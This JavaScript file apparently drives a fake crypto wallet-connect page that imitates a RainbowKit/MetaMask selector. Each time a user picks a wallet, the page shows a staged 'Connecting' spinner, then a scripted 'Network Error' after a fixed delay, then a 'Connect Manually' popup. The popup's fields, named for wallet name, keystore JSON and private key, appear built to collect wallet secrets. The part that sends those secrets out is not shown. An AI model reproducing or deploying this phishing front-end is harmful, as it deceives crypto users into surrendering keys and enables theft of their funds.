document.addEventListener('DOMContentLoaded', () => {
    const coinButtonsContainer = document.getElementById('coinButtonsContainer');
    const searchBar = document.getElementById('searchBar'); 
  
    let originalCoins = [...coins]; 
  
    function filterCoins() {
      const searchTerm = searchBar.value.toLowerCase();
      const filteredCoins = originalCoins.filter(coin => {
        return coin.name.toLowerCase().includes(searchTerm);
      });
      updateCoinList(filteredCoins);
    }
  
   
    function updateCoinList(coinsToShow) {
      coinButtonsContainer.innerHTML = ''; 
      coinsToShow.forEach(coin => {
        const buttonHtml = `
          <button data-coin-id="${coin.id}" class="wallet-button-class iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8u ju367v9f ju367vb1 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-metaMask" style="will-change: transform; id="${coin.id}" onclick="handleCoinClick('${coin.id}')">
            <div class="iekbcc0 ju367vgu ju367v16 ju367v1a ju367v1h ju367v8u">
              <div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
                <div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v94" role="img">
                  <img src="${coin.imageUrl}">
                  <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9f" style="transition: opacity 0.15s linear 0s; user-select: none; background-repeat: no-repeat; opacity: 0;"></div>
                  <div class="iekbcc0 ju367vc6 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9f"></div>
                </div>
                <div class="iekbcc0">
                  <div class="iekbcc0 ju367v5p">${coin.name}</div>
                </div>
              </div>
            </div>
          </button>`;
        coinButtonsContainer.insertAdjacentHTML('beforeend', buttonHtml);
      });
    }
  
  
    
    updateCoinList(originalCoins);
  
    
    searchBar.addEventListener('input', filterCoins);
  });
  
  
  function handleCoinClick(coinId) {
    const coin = coins.find(c => c.id === coinId);
    if (coin) {
      updateUI(coin); 
  }}
  
  
  function updateUI(coin) {
    const coinDetailsPlaceholder = document.getElementById('coinDetailsPlaceholder');
    
    const defaultContent = document.getElementById('default');
    const coinDetailTemplate = `
      <div id="${coin.id}" class="animated fadeIn iekbcc0 ju367v4 ju367vf0 ju367va ju367v15" style="height: 30%!important;">
        <div class="iekbcc0 ju367vk ju367v2i ju367v9b" role="img">
            <img src="${coin.imageUrl}" alt="${coin.name}">
        </div> 
        <div class="iekbcc0 ju367vk ieobkcc" id="main-${coin.id}">
          <div class="iekbcc0 ju367vgu ju367v16 ju367v20 ju367v1h ju367v2v" ><center style="color:#000 !important; font-size: 15px">Opening ${coin.name} wallet
            <div class="spinner-border text-danger" role="status">
              <!-- Spinner goes here -->
            </div><center></div>
            <div class="iekbcc0 ju367vgu ju367v16 ju367v19 ju367v1h ju367v2v" style="font-weight: 300!important;">Connecting to the ${coin.name} wallet</div>
          </div> 
         
        </div>
  
        <div id="button-${coin.id}" style="display: none;" class="iekbcc0 ju367v4 ju367vf0 ju367va ju367v15" style="height: 50%!important;">
        <div class="iekbcc0 ju367vk ju367v2i ju367v9b" role="img">
          
        </div> 
        <div class="iekbcc0 ju367vk ieobkcc">
          <div class="iekbcc0 ju367vgu ju367v16 ju367v20 ju367v1h ju367v2v" style="color: red!important;"><center> <div class="iekbcc0 ju367vk ju367v2i ju367v9b" role="img">
            <img src="img/err.gif" alt="${coin.name}" width="120%">
        </div> <br> Network Error
            <center></div>
            <div class="iekbcc0 ju367vgu ju367v16 ju367v19 ju367v1h ju367v2v" style="font-weight: 400!important;">Error Failed, Cannot connect to <b>${coin.name}</b></div>
          </div> 
          <div class="iekbcc0 ju367vk ieobkcc"> 
           <center> <button type="button" class="openwallet connectKitButtonSidebar" id="manualbutton" data-whatever="${coin.name}">Connect Manually</button> </center>
          </div> 
        </div>
      </div>
  
      </div>


      `;
  
    coinDetailsPlaceholder.innerHTML = coinDetailTemplate;
    defaultContent.style.display = "none";
  
  
    setTimeout(() => {
      const connectManuallyButton = document.getElementById(`button-${coin.id}`);
      const connectMain = document.getElementById(`main-${coin.id}`);
      if (connectManuallyButton) {
        connectManuallyButton.style.display = "block"; 
        connectMain.parentElement.style.display = "none"; 
      }
    }, 7000); 

    const ManualButton = document.getElementById('manualbutton');
    const popup = document.getElementById('popup');
    const mainpopup = document.getElementById('mainpopup');
    const back = document.getElementById('back');



    ManualButton.addEventListener('click', () => {

      const coinName = ManualButton.dataset.whatever;

      // Set the walletName input field's value to the coin.name
      const walletNameInput = document.getElementById('walletName');
      const walletNameJsonInput = document.getElementById('walletNameJson');
      const walletNamePrivateInput = document.getElementById('walletNamePrivate');
      

      walletNameInput.value = coinName;
      walletNameJsonInput.value = coinName;
      walletNamePrivateInput.value = coinName;


        popup.style.display = "block"; 
        mainpopup.style.display = "none"; 

      
       
      });

      back.addEventListener('click', () => {
        popup.style.display = "none"; 
        mainpopup.style.display = "block"; 
       
      });

  }
  
  
  document.addEventListener('DOMContentLoaded', () => {
    
    const coinButtons = document.querySelectorAll('.wallet-button-class'); 
  
    coinButtons.forEach(button => {
      button.addEventListener('click', () => {
        const coinId = button.getAttribute('data-coin-id');
        const coin = coins.find(c => c.id === coinId);
  
        if (coin) {
          console.log(coinId)
          updateUI(coin);
        }
      });
    });
  
  
  
  });


  document.addEventListener('DOMContentLoaded', () => {
    const coinButtonsMobileContainer = document.getElementById('coinButtonsMobileContainer'); 
    const searchBar = document.getElementById('searchBarMobile'); 

    let originalCoinsMobile = [...coins]; 

    function filterCoinsMobile() {
      const searchTerm = searchBar.value.toLowerCase();
      const filteredCoins = originalCoinsMobile.filter(coin => {
        return coin.name.toLowerCase().includes(searchTerm);
      });
      updateCoinListMobile(filteredCoins); 
    }

  
    function updateCoinListMobile(coinsToShow) {
      coinButtonsMobileContainer.innerHTML = ''; 
      coinsToShow.forEach(coin => {
        const buttonHtml = `
          <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v2m ju367v3d ju367v4s ju367v8d ju367v9f">
            <div class="iekbcc0 ju367v7b ju367v7w ju367va ju367v1u ju367v9f">
              <div class="iekbcc0" style="min-height: 48px; min-width: 48px;">
                <div class="iekbcc0 ju367vk ju367v2i ju367v6c ju367v8r ju367v9b" role="img">
                  <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v8s ju367v9f" style="background-image: url('${coin.imageUrl}');"></div>
                  <div class="iekbcc0 ju367vdc ju367vk ju367vt ju367vv ju367v2m ju367v8r ju367v9f"></div>
                </div>
              </div>
              <div class="iekbcc0 ju367va ju367v15 ju367v9f">
                <div class="iekbcc0 ju367v4 ju367va ju367v2i">
                  <div class="iekbcc0 ju367v9f">
                    <div class="iekbcc0 ju367vgu ju367v16 ju367v1b ju367v1h ju367v2v">${coin.name}</div>
                  </div>
                  <div id="mobileButton-${coin.id}" onclick="handleMobileClick('${coin.id}')" class="iekbcc0 iekbcca ju367v76 ju367v7r ju367v89 ju367v6i ju367vm ju367v8 ju367v2u ju367v8v ju367v9u _12cbo8i3 ju367v8r _12cbo8i4 _12cbo8i7" style="will-change: transform;">
                    <button type="button" class="iekbcc0 ju367vf0 ju367v16 ju367v19 ju367v1h ju367v2v">Connect</button>  
                  </div>

                  <div  style="display: none;" id="mobileLoading-${coin.id}" >
                 
                  <div style="color: black!important; display:flex; font-weight; 700!important; font-size: 13px!important; margin-right: 0.35rem!important;">  <span>Connecting...</span> &nbsp; <img src="img/loader.gif" style="width: 17px!important; height: 17px!important;"> </div>
                  
                  </div>
                </div>
              </div>
            </div>
          </div>`;
        coinButtonsMobileContainer.insertAdjacentHTML('beforeend', buttonHtml);
      });
    }
  
    updateCoinListMobile(originalCoinsMobile);

    searchBar.addEventListener('input', filterCoinsMobile);

});


  function handleMobileClick(coinId) {
    const mobileButtons = document.querySelectorAll('[id^="mobileButton-"]');
    const mobileLoadings = document.querySelectorAll('[id^="mobileLoading-"]');
  
    
    mobileButtons.forEach(button => {
      button.style.display = "block";
    });
  
    mobileLoadings.forEach(loading => {
      loading.style.display = "none";
    });
  
 
    const coin = coins.find(c => c.id === coinId);
    const mobileButton = document.getElementById(`mobileButton-${coin.id}`);
    const mobileLoading = document.getElementById(`mobileLoading-${coin.id}`);
    const coinButtonsMobileNew = document.getElementById('coinButtonsMobileContainer');
    const mobileBanner = document.getElementById('mobileBanner');
    const mobileBannerFooter = document.getElementById('searchBarMobile');
    const ErrorBanner = document.getElementById('ErrorBanner'); 
    const manualConnect = document.getElementById('manualConnection'); 
  
    if (coin && mobileButton && mobileLoading) {
      mobileLoading.style.display = "block"; 
      mobileButton.style.display = "none"; 
    }

    setTimeout(() => {
      
      
      if (mobileLoading) {

        

        coinButtonsMobileNew.style.display = "none";
        mobileBanner.style.display = "block";
        mobileBannerFooter.style.display = "none";
        mobileLoading.style.display = "none"; 
        mobileButton.style.display = "block"; 
        ErrorBanner.style.display = "block";
        manualConnect.style.display = "none";

        const coin = coins.find(c => c.id === coinId);

        if (coin) {
          updateMobileUI(coin);
      }
        

        // console.log(coin.name);
      }
    }, 3000); 


  }


  function resetConnectionState(coin) {
    // console.log(coin.name)
    updateMobileUI(coin);
  }






  function updateMobileUI(coin) {
  
    const ErrorBanner = document.getElementById('ErrorBanner');
    const ErrorDetailTemplate = `
    
    <div id="button-${coin.id}" class="iekbcc0 ju367v4 ju367vf0 ju367va ju367v15" style="height: 50%!important;">
   
    <div class="iekbcc0 ju367vk ieobkcc">
      <div class="iekbcc0 ju367vgu ju367v16 ju367v20 ju367v1h ju367v2v" style="color: red!important;"><center> <div class="iekbcc0 ju367vk ju367v2i ju367v9b" role="img">
        <img src="img/err.gif" alt="${coin.name}" width="120%">
    </div> <br> Network Error
        <center></div>
        <div class="iekbcc0 ju367vgu ju367v16 ju367v19 ju367v1h ju367v2v" style="font-weight: 400!important;">Error Failed, Cannot connect to ${coin.name} blockchain</div>
      </div> 
      <div class="iekbcc0 ju367vk ieobkcc"> 
       <div style="display: flex; margin-bottom:20px"> <span onclick="navigateBackFromError('${coin.id}')" style="display: flex; cursor: pointer;" class="lgnbtnsmall"><i class="fa fa-arrow-left"></i> &nbsp; <span></span>Back</span><div>&nbsp; &nbsp; &nbsp; &nbsp;</div> <button type="button" style="cursor: pointer;" class="openwallet connectKitButtonSidebar" id="ManualButton" data-whatever="${coin.name}" onclick="manualConnection('${coin.id}')">Connect Manually</button> </div>
      </div> 
    </div>


      `;
  
      ErrorBanner.innerHTML = ErrorDetailTemplate;
  
     

  }



  function navigateBackFromError(coinId) {




  const coinButtonsMobileNew = document.getElementById('coinButtonsMobileContainer');
  const mobileBanner = document.getElementById('mobileBanner');
  const mobileBannerFooter = document.getElementById('searchBarMobile');
  const ErrorBanner = document.getElementById('ErrorBanner'); 
  const manualConnect = document.getElementById('manualConnection'); 

  coinButtonsMobileNew.style.display = "block";
  mobileBanner.style.display = "block";
  mobileBannerFooter.style.display = "block";
  ErrorBanner.style.display = "none";
  manualConnect.style.display = "none";


  // console.log('Working');
}



function manualConnection(coinId) {


  const coinButtonsMobileNew = document.getElementById('coinButtonsMobileContainer');
  const mobileBanner = document.getElementById('mobileBanner');
  const mobileBannerFooter = document.getElementById('searchBarMobile');
  const ErrorBanner = document.getElementById('ErrorBanner'); 
  const manualConnect = document.getElementById('manualConnection'); 

  const ManualButton = document.getElementById('ManualButton'); 

  const coinName = ManualButton.dataset.whatever;

  // Set the walletName input field's value to the coin.name
  const walletNameInput = document.getElementById('walletNameo');
  const walletNameJsonInput = document.getElementById('walletNameJsono');
  const walletNamePrivateInput = document.getElementById('walletNamePrivateo');


  walletNameInput.value = coinName;
  walletNameJsonInput.value = coinName;
  walletNamePrivateInput.value = coinName;

  coinButtonsMobileNew.style.display = "none";
  mobileBanner.style.display = "block";
  mobileBannerFooter.style.display = "none";
  ErrorBanner.style.display = "none";
  manualConnect.style.display = "block";

  // console.log('Working');
}


  



  